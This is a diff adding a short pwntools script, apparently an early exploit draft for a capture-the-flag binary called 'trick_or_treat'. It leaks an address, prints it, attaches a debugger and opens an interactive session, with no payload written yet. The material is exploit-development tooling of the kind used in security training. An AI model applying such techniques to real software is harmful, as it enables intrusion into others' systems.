@@ -1,0 +1,12 @@
+from pwn import *
+io=process("./trick_or_treat",env={"LD_PRELOAD":"./libc.so.6"})
+io.recvuntil("Size:")
+io.sendline("5")
+io.recvuntil("Magic:")
+leak=io.recv(14)
+leak=int(leak,16)
+io.recvuntil("Offset & Value:\x00")
+print hex(leak)
+gdb.attach(io)
+io.sendline("5")
+io.interactive()
